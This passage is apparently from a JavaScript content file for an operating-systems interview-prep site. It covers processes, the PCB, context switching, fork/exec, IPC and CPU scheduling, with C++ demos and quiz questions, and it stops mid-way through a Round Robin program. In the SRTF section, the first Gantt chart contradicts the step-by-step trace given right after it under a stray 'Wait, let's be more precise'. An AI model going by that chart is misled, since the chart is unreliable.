const OS_CONTENT = {
  id: 'os', t: 'Operating Systems',
  tabs: [
    // ===== TAB: PROCESSES =====
    {
      id: 'proc', t: 'Processes',
      topics: [
        // ----- Topic 0: Process States, PCB & Context Switch -----
        {
          t: 'Process States, PCB & Context Switch',
          learn: '<div class="learn-section"><div class="learn-h">What is a Process?</div><p class="learn-p">A <b>process</b> is a program in execution. While a program is a passive entity stored on disk (an executable file), a process is an <b>active entity</b> with a program counter, a set of associated resources, and a current state. Each process has its own address space comprising the <b>text segment</b> (code), <b>data segment</b> (global variables), <b>heap</b> (dynamically allocated memory), and <b>stack</b> (temporary data such as function parameters, return addresses, and local variables).</p><p class="learn-p">When you launch an application, the OS creates a process by loading the executable into memory, allocating resources, and initializing a <b>Process Control Block (PCB)</b>.</p></div><div class="learn-section"><div class="learn-h">Process States</div><p class="learn-p">During its lifetime, a process transitions through several states. The <b>five-state model</b> is the most commonly used:</p><ol class="learn-list"><li><b>New</b> &mdash; The process is being created. The OS allocates a PCB and resources.</li><li><b>Ready</b> &mdash; The process is loaded in main memory and is waiting to be assigned to a CPU. It is in the <b>ready queue</b>.</li><li><b>Running</b> &mdash; The process\'s instructions are currently being executed by the CPU. On a single-core system, only one process can be in this state at a time.</li><li><b>Waiting (Blocked)</b> &mdash; The process is waiting for some event to occur (e.g., I/O completion, signal reception). It cannot proceed until the event happens.</li><li><b>Terminated</b> &mdash; The process has finished execution. The OS deallocates its resources and removes the PCB.</li></ol><p class="learn-p">Key transitions:</p><ul class="learn-list"><li><b>New &rarr; Ready:</b> Admitted by the long-term scheduler.</li><li><b>Ready &rarr; Running:</b> Dispatched by the short-term (CPU) scheduler.</li><li><b>Running &rarr; Ready:</b> Interrupted (e.g., time quantum expires in preemptive scheduling).</li><li><b>Running &rarr; Waiting:</b> Process issues an I/O request or waits for an event.</li><li><b>Waiting &rarr; Ready:</b> The event the process was waiting for completes.</li><li><b>Running &rarr; Terminated:</b> Process finishes execution or is killed.</li></ul><div class="learn-tip"><b>Tip:</b> In interview questions, remember that a process in the <b>Waiting</b> state cannot directly move to <b>Running</b>. It must first transition to <b>Ready</b> and then be scheduled.</div></div><div class="learn-section"><div class="learn-h">Process Control Block (PCB)</div><p class="learn-p">The <b>PCB</b> (also called Task Control Block) is a data structure maintained by the OS for every process. It is the repository of all information needed to manage the process. The PCB contains:</p><table class="learn-table"><tr><th>Field</th><th>Description</th></tr><tr><td>Process ID (PID)</td><td>Unique identifier for the process</td></tr><tr><td>Process State</td><td>Current state (New, Ready, Running, Waiting, Terminated)</td></tr><tr><td>Program Counter (PC)</td><td>Address of the next instruction to execute</td></tr><tr><td>CPU Registers</td><td>Contents of all process-centric registers (accumulator, stack pointer, general-purpose registers)</td></tr><tr><td>CPU Scheduling Info</td><td>Priority, pointers to scheduling queues</td></tr><tr><td>Memory Management Info</td><td>Page tables, segment tables, base/limit registers</td></tr><tr><td>Accounting Info</td><td>CPU time used, time limits, process numbers</td></tr><tr><td>I/O Status Info</td><td>List of I/O devices allocated, list of open files</td></tr></table><div class="learn-code">// Simplified PCB structure in C\nstruct PCB {\n    int pid;\n    int state;           // NEW, READY, RUNNING, WAITING, TERMINATED\n    int program_counter;\n    int registers[16];   // General-purpose registers\n    int priority;\n    struct PageTable *page_table;\n    struct FileDesc *open_files;\n    struct PCB *next;    // Pointer for queue linkage\n};</div></div><div class="learn-section"><div class="learn-h">Context Switch</div><p class="learn-p">A <b>context switch</b> occurs when the CPU switches from executing one process to another. This is the mechanism that enables multitasking. The steps involved are:</p><ol class="learn-list"><li>An interrupt or system call triggers the switch.</li><li>The OS <b>saves the context</b> (CPU registers, program counter, etc.) of the currently running process into its PCB.</li><li>The OS updates the state of the current process (Running &rarr; Ready or Running &rarr; Waiting).</li><li>The OS <b>selects a new process</b> from the ready queue using the CPU scheduling algorithm.</li><li>The OS <b>loads the context</b> of the selected process from its PCB into the CPU registers.</li><li>The OS updates the state of the new process (Ready &rarr; Running) and transfers control to it.</li></ol><p class="learn-p"><b>Context switch time</b> is pure overhead &mdash; the system does no useful work during the switch. Typical context switch times range from 1&ndash;10 microseconds on modern hardware. The time depends on:</p><ul class="learn-list"><li>Memory speed and number of registers to save/restore</li><li>Hardware support (some CPUs have special instructions for fast context switching)</li><li>Whether the OS needs to flush the TLB (Translation Lookaside Buffer)</li></ul><div class="learn-warn"><b>Warning:</b> Context switching between processes is more expensive than between threads of the same process, because threads share the same address space (no TLB flush needed).</div><p class="learn-p"><b>Overhead factors:</b> Direct cost includes saving/restoring registers. Indirect costs include TLB and cache pollution &mdash; after a context switch, the new process may experience many cache misses because the cache now contains data from the previous process.</p></div><div class="learn-section"><div class="learn-h">Schedulers</div><p class="learn-p">The OS uses three types of schedulers:</p><ul class="learn-list"><li><b>Long-term Scheduler (Job Scheduler):</b> Controls the degree of multiprogramming by deciding which processes are admitted from the job pool to the ready queue. It runs infrequently.</li><li><b>Short-term Scheduler (CPU Scheduler):</b> Selects from among the ready processes and allocates the CPU. It runs very frequently (every few milliseconds).</li><li><b>Medium-term Scheduler:</b> Handles <b>swapping</b> &mdash; temporarily removes processes from main memory to reduce the degree of multiprogramming, then reintroduces them later.</li></ul><div class="learn-tip"><b>Tip:</b> DE Shaw interviews often ask about the difference between context switch overhead for processes vs. threads, and the role of TLB flushing.</div></div>',
          code: `// Context Switch Simulation in C++
// Demonstrates saving and restoring process context

#include <iostream>
#include <queue>
#include <cstring>
using namespace std;

struct Registers {
    int eax, ebx, ecx, edx;
    int esp, ebp;       // Stack and base pointers
    int eip;            // Instruction pointer (Program Counter)
    int eflags;
};

struct PCB {
    int pid;
    int state;          // 0=NEW, 1=READY, 2=RUNNING, 3=WAITING, 4=TERMINATED
    Registers regs;
    int priority;
};

// Simulated CPU state
Registers cpu;

// Save the current CPU state into the given PCB
void saveContext(PCB &proc) {
    memcpy(&proc.regs, &cpu, sizeof(Registers));
    proc.state = 1; // Mark as READY
    cout << "Saved context of PID " << proc.pid << endl;
}

// Restore the CPU state from the given PCB
void restoreContext(PCB &proc) {
    memcpy(&cpu, &proc.regs, sizeof(Registers));
    proc.state = 2; // Mark as RUNNING
    cout << "Restored context of PID " << proc.pid << endl;
}

// Perform a context switch from procA to procB
void contextSwitch(PCB &procA, PCB &procB) {
    cout << "--- Context Switch: PID " << procA.pid
         << " -> PID " << procB.pid << " ---" << endl;

    // Step 1: Save state of currently running process
    saveContext(procA);

    // Step 2: Restore state of next process
    restoreContext(procB);

    cout << "CPU now executing PID " << procB.pid << endl;
}

int main() {
    // Initialize two processes
    PCB p1 = {1, 2, {10, 20, 30, 40, 1000, 2000, 5000, 0}, 5};
    PCB p2 = {2, 1, {50, 60, 70, 80, 3000, 4000, 7000, 0}, 3};

    // P1 is currently running; load its context
    memcpy(&cpu, &p1.regs, sizeof(Registers));
    cout << "CPU starts with PID 1, EAX=" << cpu.eax << endl;

    // Timer interrupt triggers context switch
    contextSwitch(p1, p2);
    cout << "CPU now has EAX=" << cpu.eax << endl;

    // Switch back to P1
    contextSwitch(p2, p1);
    cout << "CPU now has EAX=" << cpu.eax << endl;

    return 0;
}`,
          problems: [
            ['Process States and Transitions', 'https://www.geeksforgeeks.org/states-of-a-process-in-operating-systems/', 'Easy'],
            ['Context Switching in OS', 'https://www.geeksforgeeks.org/context-switch-in-operating-system/', 'Medium'],
            ['Process Control Block', 'https://www.geeksforgeeks.org/process-table-and-process-control-block-pcb/', 'Easy'],
          ],
          mcqs: [
            {q: 'Which of the following transitions is NOT valid in a standard five-state process model?', o: ['Running to Ready', 'Waiting to Ready', 'Waiting to Running', 'Ready to Running'], a: 2},
            {q: 'During a context switch, which of the following is saved in the PCB of the outgoing process?', o: ['Only the program counter', 'Only general-purpose registers', 'All CPU registers, program counter, and process state', 'Only the stack pointer'], a: 2},
            {q: 'What is the primary reason context switching between processes is more expensive than between threads of the same process?', o: ['Processes have more registers to save', 'Processes require TLB flush and address space switch', 'Threads cannot be preempted', 'Processes use more CPU time'], a: 1},
          ],
        },
        // ----- Topic 1: Process Creation & IPC -----
        {
          t: 'Process Creation & IPC',
          learn: '<div class="learn-section"><div class="learn-h">Process Creation</div><p class="learn-p">In Unix/Linux, a new process is created using the <code>fork()</code> system call. The calling process becomes the <b>parent</b> and the new process is the <b>child</b>. After <code>fork()</code>, both parent and child execute concurrently from the instruction following the fork call.</p><div class="learn-code">pid_t pid = fork();\nif (pid == 0) {\n    // Child process\n    printf("I am the child, PID = %d\\n", getpid());\n} else if (pid &gt; 0) {\n    // Parent process\n    printf("I am the parent, child PID = %d\\n", pid);\n} else {\n    // fork failed\n    perror("fork");\n}</div><p class="learn-p">Key behaviors of <code>fork()</code>:</p><ul class="learn-list"><li>Returns <b>0</b> to the child process.</li><li>Returns the <b>child\'s PID</b> to the parent process.</li><li>Returns <b>-1</b> on failure.</li><li>The child gets a <b>copy</b> of the parent\'s address space (uses <b>Copy-on-Write</b> for efficiency).</li><li>The child inherits open file descriptors, signal handlers, and environment.</li></ul><div class="learn-tip"><b>Tip:</b> <b>Copy-on-Write (COW)</b> means the OS doesn\'t immediately duplicate the parent\'s memory pages. Both parent and child share the same physical pages (marked read-only). Only when either process writes to a page does the OS create a separate copy. This makes fork() very efficient.</div></div><div class="learn-section"><div class="learn-h">exec() Family of System Calls</div><p class="learn-p">After <code>fork()</code>, the child often calls one of the <code>exec()</code> family functions to replace its address space with a new program. The exec family includes <code>execl</code>, <code>execv</code>, <code>execle</code>, <code>execve</code>, <code>execlp</code>, and <code>execvp</code>.</p><div class="learn-code">// Child replaces itself with "ls -l"\npid_t pid = fork();\nif (pid == 0) {\n    execlp("ls", "ls", "-l", NULL);\n    // If exec returns, it failed\n    perror("exec failed");\n    exit(1);\n}</div><p class="learn-p">The <code>wait()</code> system call makes the parent block until one of its children terminates. <code>waitpid()</code> waits for a specific child.</p></div><div class="learn-section"><div class="learn-h">Zombie and Orphan Processes</div><p class="learn-p">Two special process states arise from the parent-child relationship:</p><ul class="learn-list"><li><b>Zombie Process:</b> A process that has <b>terminated</b> but whose parent has not yet called <code>wait()</code> to read its exit status. The PCB entry remains in the process table. Zombies consume PID slots but no memory.</li><li><b>Orphan Process:</b> A process whose parent has terminated before it. The orphan is <b>adopted by init (PID 1)</b>, which periodically calls <code>wait()</code> to clean up.</li></ul><div class="learn-warn"><b>Warning:</b> A large number of zombie processes can exhaust the process table, preventing new processes from being created. Always ensure parents call <code>wait()</code> or install a <code>SIGCHLD</code> handler.</div></div><div class="learn-section"><div class="learn-h">Inter-Process Communication (IPC)</div><p class="learn-p">Since processes have <b>isolated address spaces</b>, they need special mechanisms to communicate. The main IPC methods are:</p><table class="learn-table"><tr><th>IPC Method</th><th>Description</th><th>Use Case</th></tr><tr><td>Pipes</td><td>Unidirectional byte stream between related processes</td><td>Shell pipelines (ls | grep)</td></tr><tr><td>Named Pipes (FIFOs)</td><td>Like pipes but accessible via the filesystem; works between unrelated processes</td><td>Client-server on same machine</td></tr><tr><td>Shared Memory</td><td>A region of memory mapped into multiple processes\' address spaces</td><td>High-throughput data sharing</td></tr><tr><td>Message Queues</td><td>Processes send/receive structured messages through the kernel</td><td>Asynchronous communication</td></tr><tr><td>Sockets</td><td>Communication endpoints supporting both local and network communication</td><td>Client-server, distributed systems</td></tr><tr><td>Signals</td><td>Asynchronous notifications sent to a process</td><td>Ctrl+C (SIGINT), kill commands</td></tr></table></div><div class="learn-section"><div class="learn-h">Pipes</div><p class="learn-p">A <b>pipe</b> provides a unidirectional communication channel. The <code>pipe()</code> system call creates two file descriptors: <code>fd[0]</code> for reading and <code>fd[1]</code> for writing.</p><div class="learn-code">int fd[2];\npipe(fd);\n\nif (fork() == 0) {\n    // Child: write to pipe\n    close(fd[0]);           // Close read end\n    write(fd[1], "Hello", 5);\n    close(fd[1]);\n} else {\n    // Parent: read from pipe\n    close(fd[1]);           // Close write end\n    char buf[10];\n    read(fd[0], buf, 5);\n    close(fd[0]);\n}</div></div><div class="learn-section"><div class="learn-h">Shared Memory</div><p class="learn-p"><b>Shared memory</b> is the <b>fastest IPC mechanism</b> because after the initial setup, data transfers do not involve the kernel. Both processes map the same physical memory region into their virtual address spaces. However, you must use synchronization (semaphores or mutexes) to prevent race conditions.</p><div class="learn-code">// POSIX shared memory\nint shm_fd = shm_open("/my_shm", O_CREAT | O_RDWR, 0666);\nftruncate(shm_fd, 4096);\nchar *ptr = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);\nsprintf(ptr, "Hello from Process A");\n// Process B can open the same shared memory and read it</div><div class="learn-tip"><b>Tip:</b> Shared memory vs. message passing is a classic interview question. Shared memory is faster but requires manual synchronization; message passing is easier to program but has kernel overhead for each message.</div></div><div class="learn-section"><div class="learn-h">Message Passing</div><p class="learn-p">In the <b>message-passing</b> model, processes communicate by sending and receiving messages through the kernel. This can be <b>direct</b> (naming the recipient explicitly) or <b>indirect</b> (through mailboxes/ports). Communication can be:</p><ul class="learn-list"><li><b>Blocking (synchronous):</b> Sender blocks until receiver receives; receiver blocks until a message is available.</li><li><b>Non-blocking (asynchronous):</b> Sender sends and continues; receiver gets a message or null.</li></ul><p class="learn-p">The <b>producer-consumer problem</b> is a classic example where one process produces data and another consumes it, using either shared memory with bounded buffers or message passing.</p></div>',
          code: `// Process Creation and IPC via Pipe in C++/C
// Demonstrates fork(), exec(), wait(), and pipe communication

#include <iostream>
#include <unistd.h>
#include <sys/wait.h>
#include <cstring>
using namespace std;

// Demonstrate fork() with multiple children
void forkDemo() {
    cout << "=== Fork Demo ===" << endl;
    for (int i = 0; i < 3; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            // Child process
            cout << "Child " << i << " (PID " << getpid()
                 << "), Parent PID: " << getppid() << endl;
            _exit(0); // Exit child immediately
        }
    }
    // Parent waits for all children
    for (int i = 0; i < 3; i++) {
        int status;
        pid_t finished = wait(&status);
        cout << "Child PID " << finished << " exited with status "
             << WEXITSTATUS(status) << endl;
    }
}

// Demonstrate IPC via pipe
void pipeDemo() {
    cout << "\\n=== Pipe IPC Demo ===" << endl;
    int pipefd[2];
    // pipefd[0] = read end, pipefd[1] = write end
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        // Child: write to pipe
        close(pipefd[0]); // Close unused read end
        const char *msg = "Hello from child!";
        write(pipefd[1], msg, strlen(msg) + 1);
        close(pipefd[1]);
        _exit(0);
    } else {
        // Parent: read from pipe
        close(pipefd[1]); // Close unused write end
        char buffer[256];
        ssize_t bytesRead = read(pipefd[0], buffer, sizeof(buffer));
        if (bytesRead > 0) {
            cout << "Parent received: " << buffer << endl;
        }
        close(pipefd[0]);
        wait(NULL); // Wait for child to finish
    }
}

// Demonstrate fork + exec
void execDemo() {
    cout << "\\n=== Fork + Exec Demo ===" << endl;
    pid_t pid = fork();
    if (pid == 0) {
        // Child: replace with 'echo' command
        execlp("echo", "echo", "Executed by child via exec!", NULL);
        perror("exec failed"); // Only reached if exec fails
        _exit(1);
    } else {
        wait(NULL);
        cout << "Child finished executing external program." << endl;
    }
}

int main() {
    forkDemo();
    pipeDemo();
    execDemo();
    return 0;
}`,
          problems: [
            ['Fork System Call Practice', 'https://www.geeksforgeeks.org/fork-system-call/', 'Easy'],
            ['IPC using Pipes', 'https://www.geeksforgeeks.org/pipe-system-call/', 'Medium'],
            ['Zombie and Orphan Processes', 'https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c/', 'Medium'],
            ['Shared Memory IPC', 'https://www.geeksforgeeks.org/posix-shared-memory-api/', 'Hard'],
          ],
          mcqs: [
            {q: 'What value does fork() return to the child process on success?', o: ['The child\'s PID', '0', '-1', 'The parent\'s PID'], a: 1},
            {q: 'Which IPC mechanism is the fastest because it avoids kernel involvement during data transfer?', o: ['Pipes', 'Message Queues', 'Shared Memory', 'Sockets'], a: 2},
            {q: 'What happens to an orphan process in Unix?', o: ['It becomes a zombie', 'It is terminated immediately', 'It is adopted by the init process (PID 1)', 'It remains in the waiting state forever'], a: 2},
          ],
        },
      ],
    },

    // ===== TAB: CPU SCHEDULING =====
    {
      id: 'sched', t: 'CPU Scheduling',
      topics: [
        // ----- Topic 0: FCFS & SJF Scheduling -----
        {
          t: 'FCFS & SJF Scheduling',
          learn: '<div class="learn-section"><div class="learn-h">CPU Scheduling Basics</div><p class="learn-p">The <b>CPU scheduler</b> selects a process from the ready queue and allocates the CPU to it. The goal is to maximize CPU utilization and throughput while minimizing turnaround time, waiting time, and response time.</p><p class="learn-p">Key metrics for evaluating scheduling algorithms:</p><table class="learn-table"><tr><th>Metric</th><th>Definition</th></tr><tr><td>Turnaround Time (TAT)</td><td>Completion Time - Arrival Time</td></tr><tr><td>Waiting Time (WT)</td><td>Turnaround Time - Burst Time</td></tr><tr><td>Response Time</td><td>First response - Arrival Time</td></tr><tr><td>Throughput</td><td>Number of processes completed per unit time</td></tr><tr><td>CPU Utilization</td><td>Percentage of time the CPU is busy</td></tr></table><p class="learn-p">Scheduling can be <b>preemptive</b> (a running process can be interrupted and moved to the ready queue) or <b>non-preemptive</b> (once the CPU is allocated, the process keeps it until it terminates or blocks).</p></div><div class="learn-section"><div class="learn-h">First Come First Served (FCFS)</div><p class="learn-p"><b>FCFS</b> is the simplest scheduling algorithm. Processes are executed in the order they arrive in the ready queue. It is <b>non-preemptive</b>.</p><p class="learn-p"><b>Example:</b></p><table class="learn-table"><tr><th>Process</th><th>Arrival Time</th><th>Burst Time</th></tr><tr><td>P1</td><td>0</td><td>24</td></tr><tr><td>P2</td><td>1</td><td>3</td></tr><tr><td>P3</td><td>2</td><td>3</td></tr></table><p class="learn-p">Gantt chart: <code>|--P1(0-24)--|--P2(24-27)--|--P3(27-30)--|</code></p><ul class="learn-list"><li>Waiting Times: P1=0, P2=24-1=23, P3=27-2=25</li><li>Average Waiting Time = (0+23+25)/3 = <b>16.0</b></li></ul><div class="learn-warn"><b>Warning:</b> FCFS suffers from the <b>Convoy Effect</b>: a long CPU-bound process can hold up all shorter processes behind it, dramatically increasing average waiting time. This is a very common interview question!</div><p class="learn-p"><b>Advantages:</b> Simple to implement, fair in order of arrival. <b>Disadvantages:</b> Poor average waiting time, convoy effect, not suitable for interactive systems.</p></div><div class="learn-section"><div class="learn-h">Shortest Job First (SJF) &mdash; Non-Preemptive</div><p class="learn-p"><b>SJF</b> selects the process with the <b>smallest CPU burst time</b> from the ready queue. In the non-preemptive version, once a process starts, it runs to completion.</p><p class="learn-p">SJF is <b>provably optimal</b> for minimizing average waiting time among non-preemptive algorithms.</p><p class="learn-p"><b>Example:</b></p><table class="learn-table"><tr><th>Process</th><th>Arrival Time</th><th>Burst Time</th></tr><tr><td>P1</td><td>0</td><td>6</td></tr><tr><td>P2</td><td>1</td><td>8</td></tr><tr><td>P3</td><td>2</td><td>7</td></tr><tr><td>P4</td><td>3</td><td>3</td></tr></table><p class="learn-p">Gantt chart: <code>|--P1(0-6)--|--P4(6-9)--|--P3(9-16)--|--P2(16-24)--|</code></p><p class="learn-p">At time 0, only P1 is available. At time 6, P2(8), P3(7), P4(3) are ready &mdash; P4 has shortest burst.</p></div><div class="learn-section"><div class="learn-h">Shortest Remaining Time First (SRTF) &mdash; Preemptive SJF</div><p class="learn-p"><b>SRTF</b> is the preemptive version of SJF. Whenever a new process arrives, the scheduler compares its burst time with the <b>remaining time</b> of the currently running process. If the new process has a shorter remaining time, the current process is preempted.</p><p class="learn-p"><b>Example (same as above):</b></p><p class="learn-p">Gantt chart: <code>|P1(0-1)|P1(1-2)|P1(2-3)|P4(3-6)|P1(6-9)|P3(9-16)|P2(16-24)|</code></p><p class="learn-p">Wait, let\'s be more precise:</p><ul class="learn-list"><li>t=0: P1 starts (remaining=6)</li><li>t=1: P2 arrives (burst=8). P1 remaining=5 &lt; 8, P1 continues.</li><li>t=2: P3 arrives (burst=7). P1 remaining=4 &lt; 7, P1 continues.</li><li>t=3: P4 arrives (burst=3). P1 remaining=3. Tie &rarr; P1 continues (or P4, depends on policy).</li><li>t=6: P1 completes. Ready: P2(8), P3(7), P4(3). P4 runs.</li><li>t=9: P4 completes. Ready: P2(8), P3(7). P3 runs.</li><li>t=16: P3 completes. P2 runs.</li><li>t=24: P2 completes.</li></ul><div class="learn-tip"><b>Tip:</b> The main limitation of SJF/SRTF is that the CPU burst time must be <b>known in advance</b>, which is often impossible. In practice, it is estimated using <b>exponential averaging</b>: &tau;<sub>n+1</sub> = &alpha; &middot; t<sub>n</sub> + (1 - &alpha;) &middot; &tau;<sub>n</sub>, where t<sub>n</sub> is the actual burst of the nth run and &alpha; is typically 0.5.</div></div><div class="learn-section"><div class="learn-h">Starvation in SJF</div><p class="learn-p">SJF can cause <b>starvation</b>: long processes may never execute if short processes keep arriving. The solution is <b>aging</b> &mdash; gradually increasing the priority of waiting processes over time.</p><div class="learn-warn"><b>Warning:</b> In interviews, always mention starvation as the main disadvantage of SJF and aging as the solution.</div></div>',
          code: `// FCFS and SJF (Non-Preemptive) CPU Scheduling in C++
#include <iostream>
#include <vector>
#include <algorithm>
#include <iomanip>
#include <climits>
using namespace std;

struct Process {
    int id, arrival, burst;
    int completion, turnaround, waiting;
};

// First Come First Served
void fcfs(vector<Process> procs) {
    sort(procs.begin(), procs.end(), [](const Process &a, const Process &b) {
        return a.arrival < b.arrival;
    });

    int currentTime = 0;
    double totalWT = 0, totalTAT = 0;
    int n = procs.size();

    cout << "=== FCFS Scheduling ===" << endl;
    for (auto &p : procs) {
        if (currentTime < p.arrival) currentTime = p.arrival;
        p.completion = currentTime + p.burst;
        p.turnaround = p.completion - p.arrival;
        p.waiting = p.turnaround - p.burst;
        currentTime = p.completion;
        totalWT += p.waiting;
        totalTAT += p.turnaround;
    }

    cout << "PID\\tAT\\tBT\\tCT\\tTAT\\tWT" << endl;
    for (auto &p : procs) {
        cout << "P" << p.id << "\\t" << p.arrival << "\\t" << p.burst
             << "\\t" << p.completion << "\\t" << p.turnaround
             << "\\t" << p.waiting << endl;
    }
    cout << fixed << setprecision(2);
    cout << "Avg TAT = " << totalTAT / n
         << ", Avg WT = " << totalWT / n << endl;
}

// Shortest Job First (Non-Preemptive)
void sjfNonPreemptive(vector<Process> procs) {
    int n = procs.size();
    vector<bool> done(n, false);
    int currentTime = 0, completed = 0;
    double totalWT = 0, totalTAT = 0;

    cout << "\\n=== SJF Non-Preemptive Scheduling ===" << endl;

    while (completed < n) {
        int idx = -1, minBurst = INT_MAX;
        for (int i = 0; i < n; i++) {
            if (!done[i] && procs[i].arrival <= currentTime
                && procs[i].burst < minBurst) {
                minBurst = procs[i].burst;
                idx = i;
            }
        }
        if (idx == -1) {
            currentTime++;
            continue;
        }
        procs[idx].completion = currentTime + procs[idx].burst;
        procs[idx].turnaround = procs[idx].completion - procs[idx].arrival;
        procs[idx].waiting = procs[idx].turnaround - procs[idx].burst;
        currentTime = procs[idx].completion;
        totalWT += procs[idx].waiting;
        totalTAT += procs[idx].turnaround;
        done[idx] = true;
        completed++;
    }

    cout << "PID\\tAT\\tBT\\tCT\\tTAT\\tWT" << endl;
    for (auto &p : procs) {
        cout << "P" << p.id << "\\t" << p.arrival << "\\t" << p.burst
             << "\\t" << p.completion << "\\t" << p.turnaround
             << "\\t" << p.waiting << endl;
    }
    cout << fixed << setprecision(2);
    cout << "Avg TAT = " << totalTAT / n
         << ", Avg WT = " << totalWT / n << endl;
}

int main() {
    vector<Process> procs = {
        {1, 0, 6, 0, 0, 0},
        {2, 1, 8, 0, 0, 0},
        {3, 2, 7, 0, 0, 0},
        {4, 3, 3, 0, 0, 0}
    };
    fcfs(procs);
    sjfNonPreemptive(procs);
    return 0;
}`,
          problems: [
            ['FCFS Scheduling', 'https://www.geeksforgeeks.org/program-for-fcfs-cpu-scheduling-set-1/', 'Easy'],
            ['SJF Scheduling', 'https://www.geeksforgeeks.org/program-for-shortest-job-first-or-sjf-cpu-scheduling-set-1-non-preemptive/', 'Medium'],
            ['SRTF (Preemptive SJF)', 'https://www.geeksforgeeks.org/program-for-shortest-job-first-sjf-scheduling-set-2-preemptive/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which scheduling algorithm is provably optimal for minimizing average waiting time?', o: ['FCFS', 'SJF', 'Round Robin', 'Priority Scheduling'], a: 1},
            {q: 'What is the Convoy Effect?', o: ['Short processes wait behind a long process in FCFS', 'Multiple processes terminate simultaneously', 'Priority inversion in real-time systems', 'Deadlock caused by circular wait'], a: 0},
            {q: 'How is the CPU burst time typically predicted in SJF?', o: ['It is always known in advance', 'Using exponential averaging of past bursts', 'By measuring the process size on disk', 'By counting the number of instructions'], a: 1},
          ],
        },
        // ----- Topic 1: Round Robin & Priority Scheduling -----
        {
          t: 'Round Robin & Priority Scheduling',
          learn: '<div class="learn-section"><div class="learn-h">Round Robin (RR) Scheduling</div><p class="learn-p"><b>Round Robin</b> is the most widely used scheduling algorithm in time-sharing systems. Each process is assigned a fixed <b>time quantum (q)</b>. Processes are kept in a circular FIFO queue. The CPU scheduler picks the first process, sets a timer for q time units, and lets it run. If the process finishes before q, it releases the CPU voluntarily. If it doesn\'t finish, a timer interrupt preempts it and it goes to the back of the ready queue.</p><p class="learn-p"><b>Example:</b> Time quantum q = 4</p><table class="learn-table"><tr><th>Process</th><th>Arrival Time</th><th>Burst Time</th></tr><tr><td>P1</td><td>0</td><td>10</td></tr><tr><td>P2</td><td>1</td><td>4</td></tr><tr><td>P3</td><td>2</td><td>5</td></tr></table><p class="learn-p">Gantt chart: <code>|P1(0-4)|P2(4-8)|P3(8-12)|P1(12-16)|P3(16-17)|P1(17-19)|</code></p><ul class="learn-list"><li>t=0: P1 runs for 4 units (remaining=6). At t=1, P2 arrives; at t=2, P3 arrives.</li><li>t=4: P2 runs for 4 units (completes). Queue: [P3, P1].</li><li>t=8: P3 runs for 4 units (remaining=1). Queue: [P1, P3].</li><li>t=12: P1 runs for 4 units (remaining=2). Queue: [P3, P1].</li><li>t=16: P3 runs for 1 unit (completes). Queue: [P1].</li><li>t=17: P1 runs for 2 units (completes).</li></ul></div><div class="learn-section"><div class="learn-h">Effect of Time Quantum</div><p class="learn-p">The choice of time quantum <b>q</b> significantly impacts performance:</p><ul class="learn-list"><li><b>If q is very large</b> (larger than the longest burst): RR degenerates to <b>FCFS</b>.</li><li><b>If q is very small</b> (approaching 0): Very high context switch overhead, most CPU time is spent switching rather than executing processes (called <b>processor sharing</b>).</li></ul><p class="learn-p">A <b>rule of thumb</b>: q should be large enough that 80% of CPU bursts are shorter than q. Typical values are 10&ndash;100 milliseconds.</p><div class="learn-tip"><b>Tip:</b> RR gives excellent <b>response time</b> (important for interactive systems) but can have higher <b>turnaround time</b> than SJF. It provides fairness &mdash; no starvation occurs.</div><p class="learn-p"><b>Advantages:</b> Fair, no starvation, good response time. <b>Disadvantages:</b> Higher average TAT than SJF, performance depends heavily on quantum size, more context switches.</p></div><div class="learn-section"><div class="learn-h">Priority Scheduling</div><p class="learn-p">In <b>Priority Scheduling</b>, each process is assigned a priority, and the CPU is allocated to the process with the <b>highest priority</b> (lowest number = highest priority in many systems). It can be either <b>preemptive</b> or <b>non-preemptive</b>.</p><p class="learn-p"><b>Example (Non-Preemptive):</b></p><table class="learn-table"><tr><th>Process</th><th>Arrival</th><th>Burst</th><th>Priority</th></tr><tr><td>P1</td><td>0</td><td>10</td><td>3</td></tr><tr><td>P2</td><td>0</td><td>1</td><td>1</td></tr><tr><td>P3</td><td>0</td><td>2</td><td>4</td></tr><tr><td>P4</td><td>0</td><td>1</td><td>5</td></tr><tr><td>P5</td><td>0</td><td>5</td><td>2</td></tr></table><p class="learn-p">Execution order: P2(1) &rarr; P5(5) &rarr; P1(10) &rarr; P3(2) &rarr; P4(1)</p><p class="learn-p">Average WT = (6+0+16+18+1)/5 = <b>8.2</b></p></div><div class="learn-section"><div class="learn-h">Starvation and Aging</div><p class="learn-p"><b>Starvation</b> is the major problem with priority scheduling: low-priority processes may <b>never execute</b> if higher-priority processes keep arriving.</p><p class="learn-p"><b>Aging</b> is the solution: gradually <b>increase the priority</b> of processes that have been waiting in the ready queue for a long time. For example, increase priority by 1 every 15 minutes.</p><div class="learn-warn"><b>Warning:</b> Priority inversion is a related problem where a high-priority process is indirectly blocked by a low-priority process holding a needed resource. The Mars Pathfinder incident (1997) is a famous real-world example. Solutions include <b>priority inheritance</b> and <b>priority ceiling protocols</b>.</div></div><div class="learn-section"><div class="learn-h">Combining Priority with Round Robin</div><p class="learn-p">A practical approach used in real systems: Use <b>priority scheduling between queues</b> and <b>Round Robin within each priority level</b>. This way, processes with the same priority share the CPU fairly, and higher-priority processes get preference.</p><div class="learn-tip"><b>Tip:</b> In interviews, be prepared to compare algorithms. RR is best for response time, SJF for turnaround time, and Priority scheduling for systems with clear task importance levels.</div></div>',
          code: `// Round Robin and Priority Scheduling in C++
#include <iostream>
#include <vector>
#include <queue>
#include <algorithm>
#include <iomanip>
#include <climits>
using namespace std;

struct Process {
    int id, arrival, burst, priority;
    int remaining, completion, turnaround, waiting, responseTime;
    bool started;
};

// Round Robin Scheduling
void roundRobin(vector<Process> procs, int quantum) {
    int n = procs.size();
    sort(procs.begin(), procs.end(), [](const Process &a, const Process &b) {
        return a.arrival < b.arrival;
    });
    for (auto &p : procs) { p.remaining = p.burst; p.started = false; }

    queue<int> readyQ;
    int currentTime = 0, completed = 0, idx = 0;
    double totalWT = 0, totalTAT = 0;

    // Add first process
    if (idx < n) { readyQ.push(idx); idx++; }

    cout << "=== Round Robin (q=" << quantum << ") ===" << endl;
    cout << "Gantt: ";

    while (completed < n) {
        if (readyQ.empty()) {
            currentTime = procs[idx].arrival;
            readyQ.push(idx); idx++;
        }
        int i = readyQ.front(); readyQ.pop();
